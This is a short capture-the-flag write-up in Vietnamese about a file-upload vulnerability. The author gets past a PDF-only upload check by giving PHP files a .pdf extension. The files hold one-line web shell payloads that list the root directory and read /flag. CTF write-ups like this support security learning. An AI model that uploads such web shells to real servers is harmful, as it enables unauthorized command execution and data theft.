Challenge cho 1 form điền các thông tin và có chức năng upload file, nhưng mà bắt buộc là file pdf. Dự đoán bài này là file upload vuln.

![image](https://github.com/Llam-a/TTV-KCSC/assets/115911041/28386270-2772-46c6-b942-597f2015e5b1)

Mình upload 1 file php có content như sau:

```php
<?php system('ls / -la') ?>
```

Sau đó thì sửa lại là đuôi .pdf thi được kết quả như sau, ta có thể thấy có file flag

![image](https://github.com/Llam-a/TTV-KCSC/assets/115911041/f83a1591-9770-40f3-a70c-21438747c7e7)

Tiếp tục upload cat flag 

```php
<?php system('cat /flag') ?>
```

![image](https://github.com/Llam-a/TTV-KCSC/assets/115911041/cb192c1e-ca96-4c62-91e8-3b199eaf7118)
